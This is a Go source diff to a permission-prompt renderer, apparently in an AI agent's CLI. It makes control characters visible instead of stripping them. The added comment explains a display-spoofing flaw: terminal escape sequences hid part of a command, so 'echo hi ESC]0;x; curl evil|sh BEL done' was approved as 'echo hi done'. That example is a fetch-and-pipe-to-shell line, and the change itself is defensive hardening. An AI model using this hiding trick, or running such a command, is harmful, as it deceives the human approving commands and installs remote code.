@@ -78,10 +78,16 @@ func PermissionPrompt(toolName, desc string) string {
 	// it made the text on screen differ from what would run. Only something
 	// enormous is shortened, from the middle and with a marker, so both ends
 	// stay visible and the omission is stated.
-	tool := render.StripControls(toolName)
+	//
+	// Controls are shown (VisibleControls), not stripped. StripControls
+	// removed an escape sequence together with the bytes it claimed, so an
+	// unterminated "ESC ]" hid the rest of the command, a complete OSC hid its
+	// body and ESC + ';' hid the separator: "echo hi ESC]0;x; curl evil|sh BEL
+	// done" was approved as "echo hi done" while bash ran every part of it.
+	tool := render.VisibleControls(toolName)
 	gutter := "  " + Yellow + "┃" + Reset
 	fmt.Fprintf(&sb, "\n%s %s需要授权%s  %s%s%s\n", gutter, Bold, Reset, Cyan, tool, Reset)
-	d := strings.TrimRight(render.StripControls(desc), "\n")
+	d := strings.TrimRight(render.VisibleControls(desc), "\n")
 	if strings.TrimSpace(d) != "" {
 		d = textutil.ClipMiddleBytes(d, maxPromptDescBytes)
 		for _, line := range strings.Split(d, "\n") {
